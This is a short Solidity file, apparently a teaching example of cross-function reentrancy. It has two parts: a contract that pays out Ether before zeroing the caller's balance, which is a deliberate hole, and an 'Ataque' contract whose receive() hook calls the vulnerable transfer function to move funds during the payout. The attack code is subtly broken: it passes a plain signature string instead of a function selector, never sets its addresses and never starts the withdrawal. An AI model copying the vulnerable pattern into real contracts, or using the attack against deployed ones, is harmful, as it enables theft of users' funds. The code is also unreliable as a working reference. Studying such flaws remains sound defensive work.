// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract ReentrancyCross {
    mapping (address => uint) private balances;

    function transferir(address destino, uint monto) public {
        if (balances[msg.sender] >= monto) {
        balances[destino] += monto;
        balances[msg.sender] -= monto;
        }
    }

    function retirarFondos() public {
        uint monto = balances[msg.sender];
        (bool resultado, ) = msg.sender.call{value:monto}(""); 
        require(resultado);
        balances[msg.sender] = 0;
    }
}

contract Ataque {
    address direccionContratoVulnerable;
    address direccionOwner;

    receive() external payable {
        direccionContratoVulnerable.call(abi.encodePacked("transferir(address,uint)",direccionOwner,msg.value));
    }
}